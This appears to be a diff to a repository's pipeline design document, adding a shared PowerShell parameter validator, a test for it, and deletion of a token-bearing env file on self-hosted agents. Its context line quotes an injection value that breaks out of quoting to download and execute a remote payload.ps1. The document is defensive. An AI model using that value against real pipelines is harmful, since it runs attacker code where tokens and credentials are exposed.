@@ -33,12 +33,21 @@ x'; iwr http://host/payload.ps1 | iex; '
 closed the quoting and ran on the agent, in a job holding `ADO_PAT` and the SFTP
 credentials. Queue permission is not meant to imply permission to read the token.
 
-Two checks back the rule up:
+Three checks back the rule up:
 
 | Check | Where |
 | --- | --- |
-| Every parameter is validated at run time: non-empty where required, single-line always, and matched against an expected pattern | the first step of each pipeline |
+| Every parameter is validated at run time: non-empty where required, single-line always, and matched against an expected pattern | `Assert-ParameterValue` in [scripts/pipeline/PipelineParameters.ps1](../scripts/pipeline/PipelineParameters.ps1) |
+| That validator behaves as claimed | `tests/automations/Automations.Tests.ps1` |
 | No template expression appears anywhere except an `env:` assignment | `tests/automations/Automations.Tests.ps1` |
+
+The validator lives in a `.ps1` rather than inline in each file for a reason worth
+stating: YAML is the one part of this repository the parse check, PSScriptAnalyzer and
+Pester all skip. Fifty lines of injection control sat triplicated there, so a bypass
+found in one copy had to be fixed in three, and nothing verified the three still agreed.
+Moving it into `scripts/pipeline/` puts it under the same gate as everything else. It is
+a script the pipeline calls, not a shared YAML template — the *no shared YAML* rule in
+§3 stands.
 
 The single-line check is the half that is easy to miss. Even passed as data, a value
 carrying a newline would append arbitrary `KEY=VALUE` lines to `.env.pipeline` — enough
@@ -50,7 +59,7 @@ a future parameter cannot be added by copying an unsafe line.
 
 ## 1. The shared pattern
 
-Every file here follows the same five rules. They are worth stating once rather than
+Every file here follows the same six rules. They are worth stating once rather than
 being re-derived per file.
 
 | Rule | Why |
@@ -60,6 +69,7 @@ being re-derived per file.
 | `apply` also requires a `confirmApply` parameter | The confirmation exists both here and in the script. The pipeline form is where the mistake is easiest to make. |
 | Secrets are written into `.env.pipeline` at run time | The script reads its environment the same way everywhere, so it has no idea whether it is on an agent or a laptop — and there is one code path to reason about instead of two. |
 | `publish` with `condition: always()` | The evidence of a *failed* apply is the point. The receipt records exactly which operations completed before it stopped. |
+| `.env.pipeline` is removed with `condition: always()`, before `publish` | It holds `ADO_PAT` in clear text. A Microsoft-hosted workspace is discarded after the run; a **self-hosted** one is not, and that is the case this repository exists for — the token would sit in the checkout until some later build overwrote it, readable by every other pipeline on the agent. |
 
 Organization and project are pipeline **parameters**, not literals, so the same
 definition can be pointed at another organization without editing the file.
